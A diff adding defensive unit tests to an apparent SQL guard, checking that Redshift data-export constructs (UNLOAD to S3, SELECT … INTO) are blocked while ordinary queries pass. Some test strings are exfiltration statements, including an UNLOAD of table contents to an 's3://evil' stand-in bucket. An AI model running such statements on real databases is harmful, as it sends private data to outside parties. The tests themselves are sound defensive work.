@@ -36,6 +36,26 @@ describe('sql-guard: MySQL filesystem constructs', () => {
   })
 })
 
+describe('sql-guard: Redshift exfiltration constructs', () => {
+  it('blocks UNLOAD (export to S3)', () => {
+    blocked("SELECT 1; UNLOAD ('select * from t') TO 's3://b/k' IAM_ROLE 'arn'", 'redshift')
+    blocked("UNLOAD('select * from sales') TO 's3://evil/x'", 'redshift')
+  })
+  it('blocks SELECT … INTO (materialises a table)', () => {
+    blocked('SELECT a, b INTO new_table FROM t', 'redshift')
+    blocked('SELECT * INTO #temp FROM t', 'redshift')
+  })
+  it('allows ordinary SELECT / WITH / aggregations', () => {
+    ok('SELECT date_trunc(\'day\', ts) d, sum(units) FROM production GROUP BY 1', 'redshift')
+    ok('WITH x AS (SELECT 1) SELECT * FROM x', 'redshift')
+    ok("SELECT * FROM orders WHERE region ILIKE '%east%' LIMIT 100", 'redshift')
+  })
+  it('does not trip on a value/column that merely contains the word into/unload', () => {
+    ok("SELECT note FROM docs WHERE note = 'loaded into the warehouse'", 'redshift')
+    ok('SELECT unload_count FROM metrics', 'redshift')
+  })
+})
+
 describe('sql-guard: other dialects unaffected', () => {
   it('does not block ClickHouse functions on postgres (handled by its own grants)', () => {
     ok("SELECT * FROM url('x')", 'postgres')   // not clickhouse → this guard is a no-op; pg has no url() anyway
